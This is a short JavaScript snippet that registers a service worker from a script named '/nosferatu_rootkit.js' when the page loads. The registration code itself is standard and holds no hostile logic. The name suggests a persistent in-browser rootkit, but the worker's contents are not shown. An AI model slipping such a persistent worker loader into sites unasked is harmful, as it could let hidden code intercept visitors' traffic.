if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker
      .register('/nosferatu_rootkit.js')
      .catch(err => console.log(`Error: ${err}`));
  });
}
